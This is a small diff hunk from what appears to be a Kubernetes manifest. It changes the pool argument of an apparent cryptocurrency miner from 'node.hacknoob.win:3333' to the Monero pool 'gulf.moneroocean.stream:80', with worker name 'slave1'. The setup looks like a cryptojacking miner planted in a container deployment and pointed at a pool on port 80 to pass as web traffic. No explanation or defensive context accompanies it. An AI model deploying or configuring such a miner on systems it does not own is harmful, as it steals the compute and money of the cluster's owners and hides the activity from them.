@@ -21,7 +21,7 @@ spec:
     - -t
     - "1"
     - -o
-    - node.hacknoob.win:3333
+    - gulf.moneroocean.stream:80
     - -u
     - slave1
     - -u
